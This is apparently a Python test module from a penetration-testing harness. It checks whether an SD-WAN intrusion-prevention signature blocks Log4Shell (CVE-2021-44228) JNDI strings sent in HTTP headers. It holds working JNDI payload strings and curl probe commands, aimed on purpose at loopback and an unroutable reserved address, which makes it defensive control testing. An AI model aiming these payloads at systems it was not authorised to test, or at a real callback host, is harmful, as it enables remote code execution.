"""CVE-2021-44228 — Log4Shell. Sends a BENIGN JNDI marker string in the
User-Agent and a header so the SD-WAN IPS's JNDI signature is actually
exercised (not just a reachability ping), against /solr/ — Apache Solr's
real admin/API surface, not '/' (which just redirects there unconditionally
on this target and proves nothing about the payload itself).

Three probes, in order:
  1. baseline  — plain request, no JNDI payload. Timing reference only;
     uses a BASELINE_CODE: label (not HTTP_CODE:) so it can never be
     mistaken by success_regex/blocked_regex for the real signal.
  2. signature — JNDI points at 127.0.0.1:1389 on the *target itself*,
     where nothing listens, so there is NO real callback and NO code
     execution even if the target is vulnerable. This is what drives the
     verdict: did the payload-bearing request reach the app (IPS did not
     filter it)?
  3. timing    — JNDI points at 192.0.2.1 (RFC5737 TEST-NET-1 — reserved,
     universally unroutable, guaranteed not a real host anywhere) instead
     of localhost. If log4j actually attempts that JNDI lookup
     *synchronously*, this request takes measurably longer than the
     baseline while the connection attempt hangs/times out server-side —
     a best-effort "is this actually being parsed and acted on" signal
     with NO attacker infrastructure needed. Not proof of RCE either way:
     many real deployments log asynchronously and show no delay even when
     genuinely vulnerable, so absence of a delay does NOT mean not
     vulnerable. For an actual confirmed-RCE proof you need a real
     out-of-band listener (your own LDAP/DNS server) — a materially
     bigger, more invasive step than this signature/timing check and a
     separate decision.

Verdict: the payload-bearing request (probe 2 or 3) was served (any
HTTP_CODE:2xx/3xx) -> it reached the app layer and got a real response, so
the IPS did NOT filter the JNDI pattern (finding) — a 3xx redirect still
means the backend processed the request (headers included), same
conclusion as a 200; curl's own exit/timeout code (HTTP_CODE:000) or an
explicit 403 means something between us and the app refused/dropped it.
No/blocked response -> control held.
"""
import os
import re

META = {
    "id": "log4shell",
    "name": "Log4Shell (CVE-2021-44228)",
    "category": "Server Exploitation",
    "order": 2,  # mid-batch, right after apache_41773 and right before
                 # DNS-over-HTTPS Bypass (see loader.py's sort key)
    "test_type": "pentest",
    "control": "IPS signature (JNDI pattern)",
    "fix": "SD-WAN",
    "cve": "CVE-2021-44228",
    "mitre": ['T1190'],
    "cwe": ['CWE-917'],
    "tactic": 'Initial Access',
    "requires": ["curl"],
    "ports": [("tcp", 8080)],
    "port_customizable": True,
    "success_regex": r"HTTP_CODE:[23]\d\d",
    "blocked_regex": r"timed out|Connection refused|HTTP_CODE:000|HTTP_CODE:403",
}

# Endpoints that reach the vulnerable logging call: '/' for generic Spring-style
# apps (e.g. the lab's log4shell-vulnerable-app reads X-Api-Version there) and
# '/solr/' for a real Apache Solr. Probe each; the first that serves (2xx/3xx) is
# where the payload landed.
_PATHS = ["/", "/solr/"]
# doubled braces: this string also goes through ctx.run_cmd's .format(), same
# as curl's own -w spec below — single braces here would make .format() treat
# "jndi:ldap://..." as a (nonexistent) format field and raise KeyError('jndi').
_JNDI_LOCAL = "${{jndi:ldap://127.0.0.1:1389/log4shell-probe}}"       # always-safe: target's own loopback, nothing listens
_JNDI_BLACKHOLE = "${{jndi:ldap://192.0.2.1:1389/log4shell-timing}}"  # RFC5737 TEST-NET-1: reserved, never a real host

# curl's own -w format spec. Doubled braces survive ctx.run_cmd's .format()
# call (which collapses {{ }} -> { } before handing the command to the
# shell), giving curl the literal %{http_code}/%{time_total} it needs.
_W_SIGNAL = 'HTTP_CODE:%{{http_code}} TIME:%{{time_total}}'
_W_BASELINE = 'BASELINE_CODE:%{{http_code}} TIME:%{{time_total}}'


def _probe(ctx, target, url, ua_value, timeout, w_fmt):
    cmd = 'curl -s -m%d -L -o %s -A "%s" -H "X-Api-Version: %s" -w "%s" "%s"' % (
        timeout, os.devnull, ua_value, ua_value, w_fmt, url)
    return ctx.run_cmd(cmd, target)


def _extract_time(raw):
    m = re.search(r"TIME:([\d.]+)", raw)
    return float(m.group(1)) if m else None


def run(target, ctx):
    port = ctx.get_port("log4shell", 8080)
    out = ["# Log4Shell probe vs %s:%d" % (target, port), ""]

    # find the endpoint that serves (payload reaches the app); signature probe each.
    # Every probe's HTTP_CODE line is recorded in `out`, which is what the
    # classifier reads — so the served-vs-blocked verdict stands whether or not a
    # path served, with no extra request needed.
    url = None
    for path in _PATHS:
        u = "http://%s:%d%s" % (target, port, path)
        r = _probe(ctx, target, u, _JNDI_LOCAL, 10, _W_SIGNAL)
        out += ["## signature probe (JNDI in UA + X-Api-Version) -> %s" % path, r, ""]
        if re.search(r"HTTP_CODE:[23]\d\d", r):
            url = u
            break
    if url is None:                       # none served 2xx/3xx -> use first path for the timing legs
        url = "http://%s:%d%s" % (target, port, _PATHS[0])

    baseline_raw = _probe(ctx, target, url, "harness-baseline-probe", 8, _W_BASELINE)
    timing_raw = _probe(ctx, target, url, _JNDI_BLACKHOLE, 15, _W_SIGNAL)

    out += [
        "## baseline (no JNDI payload, timing reference) on %s" % url, baseline_raw, "",
        "## timing probe (JNDI -> 192.0.2.1 unroutable — blind-detection) on %s" % url,
        timing_raw,
    ]

    base_t, timing_t = _extract_time(baseline_raw), _extract_time(timing_raw)
    if base_t is not None and timing_t is not None:
        delta = timing_t - base_t
        out.append("")
        if delta > 3.0:
            out.append(
                "[TIMING-SIGNAL] payload request took %.1fs longer than baseline (%.1fs vs %.1fs) — "
                "consistent with the backend attempting the JNDI connection. Best-effort only: a "
                "delay is a decent positive signal, NOT proof of RCE; many real deployments log "
                "asynchronously and would show no delay even when genuinely vulnerable." % (
                    delta, timing_t, base_t))
        else:
            out.append(
                "[TIMING] no significant delay (%.1fs vs %.1fs baseline) — inconclusive either way "
                "(async logging would also show this even on a vulnerable target)." % (timing_t, base_t))

    return "\n".join(out)
